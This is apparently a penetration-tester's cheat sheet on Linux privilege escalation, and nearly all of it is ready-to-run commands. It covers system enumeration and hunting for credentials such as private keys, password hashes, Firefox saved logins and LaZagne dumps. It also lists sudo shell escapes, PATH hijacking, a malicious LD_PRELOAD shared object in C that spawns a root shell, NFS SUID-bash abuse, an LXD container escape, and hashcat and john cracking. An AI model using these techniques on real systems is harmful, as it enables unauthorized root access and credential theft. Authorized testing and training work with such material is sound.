---
title: Linux Privilege Escalation
author: 0vld
date: 2026-02-08
category: linux
layout: post
---

This guide covers essential enumeration techniques for Linux privilege escalation.

> ##### TIP
>
>Enumeration is the key to privilege escalation. Understand what pieces of information to look for.
{: .block-tip }

## Initial Orientation

Typically, we want to run a few basic commands to orient ourselves:

+ `whoami` - what user are we running as
+ `id` - what groups does our user belong to?
+ `hostname` - what is the server named, can we gather anything from the naming convention?
+ `ifconfig` or `ip a` - what subnet did we land in, does the host have additional NICs in other subnets?
+ `sudo -l` - can our user run anything with sudo (as another user as root) without needing a password?

In some cases, `sudo -l` can lead to an immediate privilege escalation (for example, using `sudo su`).

Including screenshots of this information is helpful in client reports to demonstrate successful Remote Code Execution (RCE).

## Key Enumeration Targets

When you gain initial shell access to the host, check the following details:

+ OS Version
+ Kernel Version
+ Running Services
+ Installed Packages and Versions
+ Logged in Users
+ User Home Directories
+ .bash_history
+ Sudo Privileges
+ Configuration Files
+ Readable Shadow File
+ Password Hashes in /etc/passwd
+ Cron Jobs
+ Unmounted File Systems and Additional Drives
+ SETUID and SETGID Permissions
+ Writable Directories
+ Writable Files

##### Operating System Information
```bash
cat /etc/os-release
```

##### Environment Variables
```bash
echo $PATH
```
```bash
env
```

##### Group Information
```bash
groups
```
```bash
cat /etc/group
```

##### Kernel Information
```bash
uname -a
```
```bash
cat /proc/version
```
```bash
lscpu
```

##### Login Shells
```bash
cat /etc/shells
```

##### File Systems
```bash
cat /etc/fstab
```
```bash
cat /etc/fstab | grep -v "#" | column -t
```
```bash
lsblk
```

##### Network Routes
```bash
route
```

Or:
```bash
ip route
```

##### Hidden Files
```bash
find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null
```

##### Hidden Directories
```bash
find / -type d -name ".*" -ls 2>/dev/null
```

##### Temporary Directories
```bash
ls -l /tmp /var/tmp /dev/shm
```

##### Running Processes
```bash
ps aux | grep root
```
```bash
ps au
```

##### Writable Directories
```bash
find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null
```

## Initial Enumeration

```bash
ps aux | grep root
```

```bash
ps au
```

```bash
ls /home
```

```bash
ls -l ~/.ssh
```

```bash
history
```

```bash
sudo -l
```

```bash
ls -la /etc/cron.daily
```

```bash
lsblk
```

```bash
find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null
```

```bash
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
```

```bash
uname -a
```

```bash
cat /etc/lsb-release
```

```bash
screen -v
```

```bash
./pspy64 -pf -i 1000
```

```bash
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```

```bash
find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
```

```bash
echo $PATH
```

```bash
find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null
```

```bash
ldd /bin/ls
```

```bash
readelf -d <binary> | grep PATH
```

```bash
getcap -r / 2>/dev/null
```

---

## Credential Hunting

```bash
for l in $(echo ".conf .config .cnf"); do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib|fonts|share|core"; done
```

```bash
for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc|lib"); do echo -e "\nFile: " $i; grep "user|password|pass" $i 2>/dev/null | grep -v "\#"; done
```

```bash
for l in $(echo ".sql .db .*db .db*"); do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc|lib|headers|share|man"; done
```

```bash
find /home/* -type f -name "*.txt" -o ! -name "*.*"
```

```bash
for l in $(echo ".py .pyc .pl .go .jar .c .sh"); do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc|lib|headers|share"; done
```

```bash
for ext in $(echo ".xls .xls* .xltx .csv .od* .doc .doc* .pdf .pot .pot* .pp*"); do echo -e "\nFile extension: " $ext; find / -name *$ext 2>/dev/null | grep -v "lib|fonts|share|core"; done
```

```bash
cat /etc/crontab
```

```bash
ls -la /etc/cron.*/
```

```bash
grep -rnw "PRIVATE KEY" /* 2>/dev/null | grep ":1"
```

```bash
grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"
```

```bash
grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"
```

```bash
tail -n5 /home/*/.bash*
```

---

## SUID / SGID / Capabilities

> ##### TIP
>
> Cross-reference SUID/SGID binaries at https://gtfobins.github.io
{: .block-tip }

```bash
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```

```bash
find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
```

```bash
getcap -r / 2>/dev/null
```

---

## Sudo Abuse

```bash
sudo -l
```

```bash
sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
```

```bash
sudo /usr/bin/python3 -c 'import os; os.system("/bin/bash")'
```

```bash
sudo /usr/bin/perl -e 'exec "/bin/bash";'
```

```bash
sudo /usr/bin/ruby -e 'exec "/bin/bash"'
```

```bash
sudo /usr/bin/awk 'BEGIN {system("/bin/bash")}'
```

```bash
sudo find / -exec /bin/bash \; -quit
```

```bash
sudo vim -c ':!/bin/bash'
```

```bash
sudo less /etc/passwd
```

```bash
sudo env /bin/bash
```

---

## PATH Abuse

```bash
echo $PATH
```

```bash
PATH=.:${PATH}
```

```bash
echo '/bin/bash' > <command_name> && chmod +x <command_name>
```

---

## LD_PRELOAD / Shared Library Hijack

```bash
ldd /bin/ls
```

```bash
sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart
```

```bash
readelf -d <binary> | grep PATH
```

**Malicious shared object (root.c):**

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

```bash
gcc src.c -fPIC -shared -o /tmp/root.so -nostartfiles
```

```bash
gcc src.c -fPIC -shared -o /development/libshared.so
```

---

## NFS No_Root_Squash

```bash
showmount -e <ip>
```

```bash
sudo mount -t nfs <ip>:/tmp /mnt
```

```bash
cp /bin/bash /mnt/bash && chmod +s /mnt/bash
```

```bash
/mnt/bash -p
```

---

## LXD / LXC Escape

```bash
lxd init
```

```bash
lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
```

```bash
lxc init alpine r00t -c security.privileged=true
```

```bash
lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
```

```bash
lxc start r00t
```

```bash
lxc exec r00t /bin/sh
```

---

## tmux Session Hijack

```bash
tmux -S /shareds new -s debugsess
```

---

## Kernel Exploits

```bash
uname -a
```

```bash
cat /etc/lsb-release
```

```bash
gcc kernel_exploit.c -o kernel_exploit
```

> ##### WARNING
>
> Kernel exploits can crash the system. Confirm with the client first.
{: .block-warning }

---

## Lynis Audit

```bash
./lynis audit system
```

---

## Mimipenguin / LaZagne

```bash
python3 mimipenguin.py
```

```bash
bash mimipenguin.sh
```

```bash
python2.7 lazagne.py all
```

```bash
python3 lazagne.py browsers
```

---

## Firefox Saved Credentials

```bash
ls -l .mozilla/firefox/ | grep default
```

```bash
cat .mozilla/firefox/<profile>/logins.json | jq .
```

```bash
python3.9 firefox_decrypt.py
```

---

## Shell Spawning / TTY Upgrade

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

```bash
/bin/sh -i
```

```bash
perl -e 'exec "/bin/sh";'
```

```bash
ruby -e 'exec "/bin/sh"'
```

```bash
awk 'BEGIN {system("/bin/sh")}'
```

```bash
find . -exec /bin/sh \; -quit
```

```bash
vim -c ':!/bin/sh'
```

```bash
lua -e 'os.execute("/bin/sh")'
```

**Full interactive TTY:**

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

---

## Password Cracking

```bash
hashcat -m 1000 dumpedhashes.txt /usr/share/wordlists/rockyou.txt
```

```bash
hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked
```

```bash
unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
```

```bash
python3 ssh2john.py SSH.private > ssh.hash && john ssh.hash --show
```

```bash
office2john.py Protected.docx > protected-docx.hash
```

```bash
john --wordlist=rockyou.txt protected-docx.hash
```

```bash
pdf2john.pl PDF.pdf > pdf.hash && john --wordlist=rockyou.txt pdf.hash
```

```bash
zip2john ZIP.zip > zip.hash && john --wordlist=rockyou.txt zip.hash
```

##### Writable Files
```bash
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
```
+ [Exec Shield](https://en.wikipedia.org/wiki/Exec_Shield)
+ [iptables](https://linux.die.net/man/8/iptables)
+ [AppArmor](https://apparmor.net/)
+ [SELinux](https://www.redhat.com/en/topics/linux/what-is-selinux)
+ [Fail2ban](https://github.com/fail2ban/fail2ban)
+ [Snort](https://www.snort.org/faq/what-is-snort)
+ [Uncomplicated Firewall (ufw)](https://wiki.ubuntu.com/UncomplicatedFirewall)

---